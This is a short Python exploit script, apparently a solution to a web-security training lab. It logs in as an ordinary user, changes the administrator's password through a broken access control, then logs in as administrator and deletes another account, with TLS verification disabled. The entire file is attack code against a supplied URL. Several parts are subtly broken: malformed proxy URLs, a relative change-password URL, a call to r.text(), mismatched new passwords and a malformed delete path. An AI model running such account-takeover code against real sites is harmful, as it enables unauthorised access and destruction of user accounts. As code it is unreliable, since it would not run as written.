import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text,  'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def change_admin_password(s, url):   
    #Retrieve the CSRF Token from the request
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)
    #Rest of the code is below
    #Login as the user using the credencials given 
    print('(+) Logging in as user Weiner...')
    Data_Login = {'csrf': csrf_token, 'username':'weiner', 'password': 'peter'}
    r= s.post(login_url, data=Data_Login, verify= False, proxies=proxies)
    res= r.text
    if 'Log out' in res:
        print('(+) Successfully logged in as the user weiner')        
        #Change the password of the admin user 
        print('(+) We are now changing the password of the admin user...')
        change_password_url= "/my-account/change-password"
        csrf_token = get_csrf_token(s, url + "/my-account" )
        data_change_password = {'csrf': csrf_token, 'username':'administrator', 'new_password_1': 'test', 'new_password_2': 'test1'} 
        r = s.post(change_password_url, data=data_change_password, verify=False, proxies=proxies)
        res = r.text()
        #Successful solving message 
        if 'password changed successfully' in res:
            print('(+) Successfully changed the password of the admin user to  new_password_1')
        else:
            print('(+) Failure to change the password of the admin user')
            sys.exit(-1)
    else:
        print('(+) Failure to log in as the user weiner')

def delete_carlos(s2, url):
        #Retrieve the CSRF Token from the request
    login_url = url + "/login"
    csrf_token = get_csrf_token(s2, login_url)
    #Rest of the code is below
    #Login as the administrator
    print('(+) Logging in as user administrator...')
    Data_Login = {'csrf': csrf_token, 'username':'administrator', 'password': 'test'}
    r= s2.post(login_url, data=Data_Login, verify= False, proxies=proxies)
    res= r.text
    if 'Log out' in res:
        print('(+) Successfully logged in as the user administrator')
        #Delete Carlos user using the admin panal
        delete_carlos_url = url + "/admin/delete/username=carlos"
        r = s2.get(delete_carlos_url, verify=False, proxies=proxies)
        if 'congratulations' in r.text:
            print ('(+) Successfully deleted the carlos user from the database')
        else:
            print ('(+) Unable to delete the carlos user from the database')
            sys.exit(-1)  
    else:
        print('(+) Failure to change the password of the admin user')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()    
    url = sys.argv[1]
    change_admin_password(s, url)

    s2=requests.session()
    delete_carlos(s2, url)

if __name__ == '__main__':
    main()